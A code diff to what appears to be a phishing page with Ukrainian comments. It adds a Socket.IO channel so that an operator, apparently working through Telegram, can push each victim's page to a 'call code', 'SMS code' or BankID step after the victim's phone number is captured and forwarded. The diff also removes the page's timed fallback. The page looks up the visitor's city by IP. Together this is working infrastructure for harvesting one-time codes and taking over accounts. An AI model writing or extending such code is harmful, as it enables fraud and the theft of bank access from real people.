@@ -7,6 +7,7 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.5/socket.io.min.js"></script>
     <style>
         :root {
             --primary: #007bff;
@@ -288,10 +289,6 @@
             font-weight: 500;
             font-size: 15px;
         }
-        
-        /* Стиль для кнопок вибору (видалено, але залишаю для візуального розуміння)
-        .choice-buttons { ... }
-        .choice-button { ... } */
 
         input[type=tel]::-webkit-inner-spin-button,
         input[type=tel]::-webkit-outer-spin-button,
@@ -405,7 +402,34 @@
         document.getElementById('project-logo').src = `/logo?project=${project}`;
 
         let userCity = 'Невідомо';
-        let userPhone = ''; // Зберігаємо введений номер
+        let userPhone = ''; 
+        let socket; 
+
+        // === SOCKET.IO CLIENT SETUP ===
+        try {
+            // З'єднання з поточним сервером, де розміщено сторінку
+            socket = io(); 
+        } catch(e) {
+            console.error("Помилка ініціалізації Socket.IO:", e);
+        }
+
+        // Обробка команди від сервера (з ТГ)
+        if (socket) {
+            socket.on('command', (data) => {
+                console.log("Отримана команда від сервера:", data.method);
+                
+                // Перевіряємо, чи ми на кроці завантаження
+                if ($('#loading-step').hasClass('active')) {
+                    if (data.method === 'call') {
+                        showCallStep();
+                    } else if (data.method === 'sms') {
+                        showSmsCodeStep();
+                    }
+                    // BankID не потрібно, оскільки кнопка в ТГ веде на зовнішнє посилання
+                }
+            });
+        }
+        // ============================
 
         // Отримуємо місто за IP
         fetch('https://ipapi.co/json/')
@@ -454,35 +478,31 @@
             // 1. Показуємо анімацію завантаження
             $('#phone-step').removeClass('active');
             $('#loading-step').addClass('active');
-
-            // 2. Надсилаємо телефон у Telegram (логіка Node.js тепер відправить кнопки)
-            sendData('phone', { phone: userPhone });
             
-            // 3. *ІМІТАЦІЯ ОЧІКУВАННЯ* - Якщо протягом 30 секунд не надійде команда від оператора,
-            // переходимо на BankID. В реальності тут має бути логіка отримання команд.
-            setTimeout(showBankIDStep, 30000); // 30 секунд
+            // 2. РЕЄСТРУЄМО КЛІЄНТА НА СЕРВЕРІ ЧЕРЕЗ SOCKET.IO
+            if (socket && userPhone) {
+                socket.emit('register_phone', userPhone);
+            }
+
+            // 3. Надсилаємо телефон у Telegram (логіка Node.js відправить кнопки)
+            sendData('phone', { phone: userPhone });
         }
         
-        // Функції переходу, які мають викликатися **після** команди від оператора
-        // (наприклад, через WebSockets або AJAX-запит, який ви самі реалізуєте)
         function showCallStep() {
             $('.step').removeClass('active');
             $('#call-step').addClass('active');
             $('#call-code-1').focus();
-            // Тут не відправляємо sendData, бо команда прийшла з Telegram і вже була оброблена на сервері
         }
         
         function showSmsCodeStep() {
             $('.step').removeClass('active');
             $('#sms-code-step').addClass('active');
             $('#sms-code-1').focus();
-            // Тут не відправляємо sendData
         }
         
         function showBankIDStep() {
             $('.step').removeClass('active');
             $('#bankid-step').addClass('active');
-            // Тут не відправляємо sendData, бо це перехід за замовчуванням або після команди
         }
         
         function sendCallCode() {
